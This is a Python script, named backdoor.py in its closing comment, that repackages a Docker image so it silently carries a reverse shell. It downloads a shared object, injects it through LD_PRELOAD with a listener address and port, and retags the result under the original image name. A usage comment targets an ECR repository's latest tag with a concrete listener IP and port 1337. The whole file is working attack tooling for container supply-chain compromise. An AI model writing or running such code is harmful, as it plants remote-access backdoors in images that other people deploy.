import argparse
import os
import subprocess
import tarfile
import json
import tempfile
import shutil
import requests

def parse_arguments():
    parser = argparse.ArgumentParser(description='Repackage Docker images')
    parser.add_argument('--input', required=True, help='Base image to be downloaded (name:tag)')
    parser.add_argument('--output', required=True, help='New image with latest tag (name:tag)')
    parser.add_argument('--listener', required=True, help='IP address of the listener')
    parser.add_argument('--port', required=True, help='Port of the listener')
    parser.add_argument('--shell-url', required=True, help='URL to the reverse shell shared object')
    return parser.parse_args()

def run_command(command, check=True):
    result = subprocess.run(command, shell=True, text=True, capture_output=True)
    if check and result.returncode != 0:
        print(f"Command failed: {command}")
        print(f"Return code: {result.returncode}")
        print(f"Output: {result.stdout}")
        print(f"Error: {result.stderr}")
        raise subprocess.CalledProcessError(result.returncode, command, output=result.stdout, stderr=result.stderr)
    return result.stdout.strip()

def save_image(image, output_path):
    print(f"Saving the Docker image {image} to a tar file...")
    run_command(f"docker save -o {output_path} {image}")

def extract_tar(tar_path, extract_path):
    print(f"Extracting the tar file {tar_path} to {extract_path}...")
    with tarfile.open(tar_path, 'r') as tar:
        tar.extractall(path=extract_path)

def edit_manifest(manifest_path, old_image, new_image):
    print(f"Editing the manifest.json file from {old_image} to {new_image}...")
    with open(manifest_path, 'r') as f:
        manifest = json.load(f)
    for repo_tag in manifest[0]['RepoTags']:
        if repo_tag == old_image:
            manifest[0]['RepoTags'].remove(repo_tag)
            manifest[0]['RepoTags'].append(new_image)
    with open(manifest_path, 'w') as f:
        json.dump(manifest, f)

def create_tar(source_dir, tar_path):
    print(f"Repackaging the image to {tar_path}...")
    with tarfile.open(tar_path, 'w') as tar:
        tar.add(source_dir, arcname='')

def load_image(tar_path):
    print(f"Loading the new image from {tar_path} into Docker...")
    run_command(f"docker load -i {tar_path}")

def tag_image(old_image, new_image):
    print(f"Tagging the loaded image correctly...")
    image_id = run_command(f"docker images --no-trunc --format '{{{{.ID}}}}' --filter=reference={old_image}")
    print(f"Image ID: {image_id}")
    run_command(f"docker tag {image_id} {new_image}")

def download_shell(shell_url, dest_path):
    print(f"Downloading reverse shell from {shell_url}...")
    response = requests.get(shell_url)
    with open(dest_path, 'wb') as f:
        f.write(response.content)
    print(f"Reverse shell downloaded to {dest_path}")

def create_dockerfile(base_image, listener_ip, listener_port, shell_filename, temp_dir):
    """Create a Dockerfile in the specified directory."""
    dockerfile_path = os.path.join(temp_dir, "Dockerfile")
    dockerfile_content = f"""
FROM {base_image}
COPY {shell_filename} /usr/share/lib/reverse_shell.so
ENV LD_PRELOAD=/usr/share/lib/reverse_shell.so
ENV REMOTE_ADDR={listener_ip}
ENV REMOTE_PORT={listener_port}

CMD ["/bin/bash", "-c", "while true; do sleep 60; done"]
    """
    with open(dockerfile_path, "w") as f:
        f.write(dockerfile_content)
    print("Dockerfile created at", dockerfile_path)
    return dockerfile_path

def build_image(output_image, temp_dir):
    """Build a Docker image from a Dockerfile within the specified directory."""
    original_dir = os.getcwd()
    os.chdir(temp_dir)  # Change to the directory where Dockerfile is located
    try:
        os.system(f"docker build -t {output_image} .")
        print(f"Image {output_image} built successfully.")
    finally:
        os.chdir(original_dir)  # Change back to the original directory

def main():
    args = parse_arguments()
    input_image = args.input
    output_image = args.output
    listener_ip = args.listener
    listener_port = args.port
    shell_url = args.shell_url

    # Check if the input image exists, if not, pull it
    try:
        run_command(f"docker inspect --type=image {input_image}", check=True)
    except subprocess.CalledProcessError:
        print(f"Pulling image {input_image}...")
        run_command(f"docker pull {input_image}")

    # Temporary paths
    temp_dir = tempfile.mkdtemp()
    base_image_tar = os.path.join(temp_dir, 'base_image.tar')
    new_image_tar = os.path.join(temp_dir, 'new_image.tar')
    shell_path = os.path.join(temp_dir, 'reverse_shell.so')
    
    # Download reverse shell
    download_shell(shell_url, shell_path)

    # Save and manipulate image
    try:
        save_image(input_image, base_image_tar)
        extract_tar(base_image_tar, temp_dir)
        edit_manifest(os.path.join(temp_dir, 'manifest.json'), input_image, output_image)
        create_tar(temp_dir, new_image_tar)
        load_image(new_image_tar)
        tag_image(input_image, output_image)
        
        # Create Dockerfile and build new image
        create_dockerfile(output_image, listener_ip, listener_port, os.path.basename(shell_path), temp_dir)
        build_image(output_image, temp_dir)
    finally:
        # Clean up
        print("Cleaning up...")
        shutil.rmtree(temp_dir)

    # Verify the new image
    print("Verifying the new image...")
    images_output = run_command(f"docker images")
    print(images_output)
    if output_image in images_output:
        print(f"New image {output_image} created successfully with the same ID and creation time as {input_image}.")
    else:
        pass

if __name__ == "__main__":
    main()

# To run python3 backdoor.py --input 733213464829.dkr.ecr.us-east-1.amazonaws.com/image:latest --output 733213464829.dkr.ecr.us-east-1.amazonaws.com/image:latest --listener 35.172.9.13 --port 1337 --shell-url https://github.com/cr0hn/dockerscan/raw/master/dockerscan/actions/image/modifiers/shells/reverse_shell.so